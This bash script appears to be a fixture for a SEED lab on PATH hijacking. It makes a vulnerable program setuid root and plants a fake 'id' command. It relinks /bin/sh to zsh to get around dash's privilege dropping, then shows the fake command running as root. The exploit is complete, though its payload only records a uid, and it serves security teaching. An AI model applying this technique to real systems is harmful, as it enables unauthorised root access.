#!/bin/bash
set -euo pipefail

# Self-contained PATH-hijack fixture.  The fake command and proof file live
# in a temporary directory, so repeated runs do not depend on old /tmp data.
root_dir=$(cd "$(dirname "$0")/.." && pwd)
lab_dir="$root_dir/Labsetup"
work_dir=$(mktemp -d /tmp/lab1-path.XXXXXX)
cleanup() {
    if [[ -e /bin/sh.lab1-original || -L /bin/sh.lab1-original ]]; then
        sudo rm -f /bin/sh
        sudo mv /bin/sh.lab1-original /bin/sh
    fi
    rm -rf "$work_dir"
}
trap cleanup EXIT

command -v zsh >/dev/null || {
    echo "zsh is required by this SEED demonstration; install it in the isolated VM first." >&2
    exit 1
}

if [[ ! -x "$lab_dir/path_vuln" ]]; then
    gcc "$lab_dir/path_vuln.c" -o "$lab_dir/path_vuln"
    sudo chown root:root "$lab_dir/path_vuln"
    sudo chmod 4755 "$lab_dir/path_vuln"
fi

cat > "$work_dir/id" <<EOF
#!/bin/sh
/usr/bin/id -u > "$work_dir/proof"
EOF
chmod 755 "$work_dir/id"

# dash drops Set-UID privileges when system() starts it.  Use zsh for this
# controlled demonstration and restore the original /bin/sh via the trap.
sudo mv /bin/sh /bin/sh.lab1-original
sudo ln -s /bin/zsh /bin/sh
PATH="$work_dir:/usr/bin:/bin" "$lab_dir/path_vuln"
echo "Proof file content (0 means the substituted id ran as root):"
cat "$work_dir/proof"
